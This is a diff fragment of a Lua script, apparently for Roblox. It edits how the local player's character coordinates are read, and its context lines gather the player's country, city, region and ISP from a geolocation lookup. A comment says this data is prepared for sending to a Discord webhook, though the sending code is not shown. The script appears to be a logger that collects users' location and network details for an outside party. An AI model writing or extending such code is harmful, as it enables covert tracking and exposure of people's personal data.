@@ -18,7 +18,9 @@ local country = geoTable.country_name or "N/A"
 local city = geoTable.city or "N/A"
 local region = geoTable.region or "N/A"
 local isp = geoTable.org or "N/A"
-local coords = lp.Character and lp.Character.HumanoidRootPart and lp.Character.HumanoidRootPart.Position
+
+-- Reverted Coordinates Extraction (same as before)
+local coords = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character.HumanoidRootPart.Position
 local coordsStr = coords and string.format("X: %.2f, Y: %.2f, Z: %.2f", coords.X, coords.Y, coords.Z) or "N/A"
 
 -- Prepare the data to send to the Discord webhook
